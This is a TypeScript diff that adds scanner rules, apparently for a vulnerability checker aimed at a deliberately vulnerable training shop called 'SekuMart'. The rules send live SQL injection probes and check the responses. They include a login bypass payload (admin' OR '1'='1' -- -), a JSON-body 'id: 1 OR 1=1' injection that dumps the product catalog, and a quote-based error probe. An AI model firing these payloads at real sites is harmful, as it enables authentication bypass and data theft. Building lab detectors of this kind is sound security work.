@@ -19082,6 +19082,125 @@ const sekumartMembersNosqlRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+async function probeSekumartLoginAuthBypass(ctx: RuleContext): Promise<RuleResult | null> {
+  const url = new URL("/login.php", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, {
+    method: "POST",
+    body: "username=admin' OR '1'='1' -- -&password=x",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 8192,
+    timeoutMs: 12000
+  });
+  if (doc.status < 200 || doc.status >= 400) return null;
+  if (!/account|welcome|logged in|Sign out|logout/i.test(doc.body)) return null;
+  if (/invalid credentials|login failed|sign in/i.test(doc.body) && !/account/i.test(doc.body)) return null;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url,
+      snippet: doc.body.match(/<title>[^<]*account/i)?.[0] ?? doc.body.slice(0, 200).trim(),
+      note:
+        "SekuMart POST /login.php username=admin' OR '1'='1' -- - bypasses authentication — auth-bypass SQLi training oracle"
+    }
+  };
+}
+
+const sekumartLoginSqliLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  return (await probeSekumartLoginAuthBypass(ctx)) ?? NEGATIVE;
+};
+
+const sekumartLoginSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/login\.php/i.test(pageUrl)) return NEGATIVE;
+  const result = await sekumartLoginSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note:
+        "SekuMart /login.php route scan — POST auth-bypass SQLi with admin' OR '1'='1' -- - reaches account page — sqlmap training oracle"
+    }
+  };
+};
+
+async function probeSekumartApiv1JsonSqli(ctx: RuleContext): Promise<RuleResult | null> {
+  const url = new URL("/apiv1.php", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, {
+    method: "POST",
+    body: JSON.stringify({ id: "1 OR 1=1" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 16384,
+    timeoutMs: 12000
+  });
+  if (doc.status < 200 || doc.status >= 500) return null;
+  if (!/"products"\s*:\s*\[/.test(doc.body)) return null;
+  const productCount = (doc.body.match(/"id"\s*:/g) || []).length;
+  if (productCount < 3) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url,
+      productCount,
+      snippet: doc.body.slice(0, 200).trim(),
+      note:
+        'SekuMart POST /apiv1.php {"id":"1 OR 1=1"} returns multiple products via JSON-body SQLi — sqlmap training oracle'
+    }
+  };
+}
+
+const sekumartApiv1JsonSqliLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  return (await probeSekumartApiv1JsonSqli(ctx)) ?? NEGATIVE;
+};
+
+const sekumartApiv1JsonSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/apiv1\.php/i.test(pageUrl)) return NEGATIVE;
+  const result = await sekumartApiv1JsonSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note:
+        "SekuMart /apiv1.php route scan — POST JSON-body id injection returns full product catalog — sqlmap --openapi training oracle"
+    }
+  };
+};
+
+const sekumartCategorySqliLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  return (await probeSekumartMysqliSqli(ctx, "/category.php", "cat", "1'")) ?? NEGATIVE;
+};
+
+const sekumartCategorySqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/category\.php/i.test(pageUrl)) return NEGATIVE;
+  const result = await sekumartCategorySqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note:
+        "SekuMart /category.php route scan — GET ?cat=1' triggers mysqli_sql_exception in category_low.php — integer SQLi training oracle"
+    }
+  };
+};
+
 // --- BreakTheFlask vulnerable Flask writeup labs (dghostninja.github.io)
 const CLIENT_BREAK_THE_FLASK_RES: { label: string; re: RegExp }[] = [
   {
@@ -123542,6 +123661,12 @@ export const RULES: Record<string, Rule> = {
   sekumartCatalogOrderBySqliRouteLiveOracle,
   sekumartMembersNosqlLiveOracle,
   sekumartMembersNosqlRouteLiveOracle,
+  sekumartLoginSqliLiveOracle,
+  sekumartLoginSqliRouteLiveOracle,
+  sekumartApiv1JsonSqliLiveOracle,
+  sekumartApiv1JsonSqliRouteLiveOracle,
+  sekumartCategorySqliLiveOracle,
+  sekumartCategorySqliRouteLiveOracle,
   clientSideBreakTheFlaskEvidence,
   clientSideFlaskVulnappEvidence,
   clientSideFlaskVulnappStoredXssEvidence,
